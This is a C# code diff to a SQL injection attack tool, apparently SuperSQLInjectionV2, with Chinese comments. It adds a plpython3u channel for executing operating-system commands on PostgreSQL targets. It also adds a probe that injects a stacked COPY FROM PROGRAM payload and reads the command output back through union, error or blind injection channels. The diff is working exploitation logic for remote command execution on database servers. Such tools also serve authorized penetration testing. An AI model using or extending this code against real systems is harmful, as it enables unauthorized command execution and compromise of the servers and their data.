@@ -931,7 +931,8 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
 
         /// <summary>
         /// PostgreSQL 命令执行分发：默认 COPY FROM PROGRAM（9.3+，需superuser/pg_execute_server_program）；
-        /// 选择"UDF sys_eval"时走 lib_postgresqludf_sys 通道（8.2~9.4，需堆叠注入）
+        /// 选择"UDF sys_eval"时走 lib_postgresqludf_sys 通道（8.2~9.4，需堆叠注入）；
+        /// 选择"PlPython"时走 plpython3u 扩展函数通道（纯SQL部署无二进制，需superuser+可装扩展）
         /// </summary>
         private static async Task ExecuteCmdPostgreSQL(AppConfig config, FileCmdViewModel vm)
         {
@@ -940,20 +941,109 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                 await ExecuteCmdPostgreSqlUdf(config, vm).ConfigureAwait(false);
                 return;
             }
+            if (!string.IsNullOrEmpty(vm.SelectedCmdMethod) && vm.SelectedCmdMethod.Contains("PlPython", StringComparison.Ordinal))
+            {
+                await ExecuteCmdPostgreSqlCopy(config, vm, "CmdExec@PlPython", false).ConfigureAwait(false);
+                return;
+            }
             await ExecuteCmdPostgreSqlCopy(config, vm).ConfigureAwait(false);
         }
 
+        /// <summary>PG族 COPY FROM PROGRAM 能力实测探针结果缓存（目标+通道为key，同会话只探一次）</summary>
+        private static readonly Dictionary<string, bool> PgCopyProgramProbeCache = new Dictionary<string, bool>(StringComparer.Ordinal);
+
         /// <summary>
-        /// PostgreSQL COPY FROM PROGRAM执行命令（9.3+，需要superuser或pg_execute_server_program角色）
+        /// PostgreSQL族 COPY FROM PROGRAM 能力实测探针（会话缓存）：
+        /// 命令执行前先发送 echo 探针堆叠语句，按当前通道读回临时表内容验证能力是否真实可用，
+        /// 不可用则明确报错（权限不足/特性被移除，如openGauss），避免静默空结果误判为"命令无输出"。
+        /// 实测成本：Union/报错3包、盲注通道约2~4包，同目标同通道一会话只探一次。
         /// </summary>
-        private static async Task ExecuteCmdPostgreSqlCopy(AppConfig config, FileCmdViewModel vm)
+        private static async Task<bool> ProbePgCopyProgram(AppConfig config)
         {
+            string key = (config.Host ?? "") + ":" + config.Port + "|" + config.DataConfig.SelectedInjectType;
+            if (PgCopyProgramProbeCache.TryGetValue(key, out bool cached))
+            {
+                if (!cached)
+                {
+                    Log.Warning("COPY FROM PROGRAM 本次会话已实测不可用，跳过重复探测！");
+                }
+                return cached;
+            }
+            bool ok = false;
+            try
+            {
+                const string marker = "sqli_pg_probe_ok";
+                //复用CmdExec模板：drop+create+copy from program，与实际命令执行同路径同权限要求
+                string probePayload = PayloadFactory.BasePayload.Get("CmdExec").Replace("{cmd}", "echo " + marker, StringComparison.Ordinal);
+                await SendPayload(config, probePayload).ConfigureAwait(false);
+                if (config.DataConfig.SelectedInjectType == InjectType.Union || config.DataConfig.SelectedInjectType == InjectType.Error)
+                {
+                    string scalar = "(select coalesce((select data from ssqlinjection limit 1),chr(32)))";
+                    string? row = config.DataConfig.SelectedInjectType == InjectType.Union
+                        ? await DataComm.DataDumpWithNoFrom(config, scalar).ConfigureAwait(false)
+                        : await DataComm.DataDumpWithError(config, scalar).ConfigureAwait(false);
+                    ok = row != null && row.Contains(marker, StringComparison.Ordinal);
+                }
+                else
+                {
+                    //盲/时间/堆叠通道：单发布尔存在性判定（1~2包）
+                    string cond = "(case when exists(select 1 from ssqlinjection where data like '" + marker + "%') then 1 else 0 end)";
+                    int v = await DataComm.GetBoolValue(config, cond, 0, 1).ConfigureAwait(false);
+                    ok = v == 1;
+                }
+            }
+            catch (Exception e)
+            {
+                Log.SysLog("COPY FROM PROGRAM 探针异常：" + e.Message);
+            }
+            finally
+            {
+                //清理探针临时表
+                try
+                {
+                    await SendPayload(config, PayloadFactory.BasePayload.Get("CmdDropTable")).ConfigureAwait(false);
+                }
+                catch (Exception)
+                {
+                }
+            }
+            PgCopyProgramProbeCache[key] = ok;
+            if (ok)
+            {
+                Log.Success("COPY FROM PROGRAM 实测可用（探针回读验证通过）！");
+            }
+            else
+            {
+                Log.Warning("COPY FROM PROGRAM 实测不可用：探针未回读到预期输出。可能原因：非superuser/无pg_execute_server_program角色/目标库阉割该特性。可换 PlPython 或 UDF sys_eval 方式重试。");
+            }
+            return ok;
+        }
+
+        /// <summary>
+        /// PostgreSQL COPY FROM PROGRAM执行命令（9.3+，需要superuser或pg_execute_server_program角色）。
+        /// execKey指定命令执行模板key（默认CmdExec；CmdExec@PlPython为plpython3u扩展兜底变体）；
+        /// probe=true时先实测COPY FROM PROGRAM能力（会话缓存），不可用直接终止并明示原因
+        /// </summary>
+        private static async Task ExecuteCmdPostgreSqlCopy(AppConfig config, FileCmdViewModel vm, string execKey = "CmdExec", bool probe = true)
+        {
+            string execTemplate;
+            if (!PayloadFactory.BasePayload.PayLoadSQL.TryGetValue(execKey, out string? tpl) || string.IsNullOrWhiteSpace(tpl))
+            {
+                Log.Error("当前数据库模板未启用 " + execKey + " 命令执行方式（模板缺该key或被overlay关闭）！");
+                return;
+            }
+            execTemplate = tpl;
+            if (probe && !await ProbePgCopyProgram(config).ConfigureAwait(false))
+            {
+                Log.Error("命令执行终止：COPY FROM PROGRAM 实测不可用（详见上方探针日志），可换其他命令执行方式重试！");
+                return;
+            }
             try
             {
                 string cmd = vm.CmdText.Replace("'", "''", StringComparison.Ordinal);
                 await SendPayload(config, PayloadFactory.BasePayload.Get("CmdDropTable")).ConfigureAwait(false);
-                await SendPayload(config, PayloadFactory.BasePayload.Get("CmdExec").Replace("{cmd}", cmd, StringComparison.Ordinal)).ConfigureAwait(false);
-                Log.SysLog("命令已执行：" + vm.CmdText + "（需要superuser或pg_execute_server_program角色）");
+                await SendPayload(config, execTemplate.Replace("{cmd}", cmd, StringComparison.Ordinal)).ConfigureAwait(false);
+                Log.SysLog("命令已执行：" + vm.CmdText + (probe ? "（需要superuser或pg_execute_server_program角色）" : "（plpython3u扩展通道，需要superuser）"));
                 try
                 {
                     if (!vm.CmdShowResult)
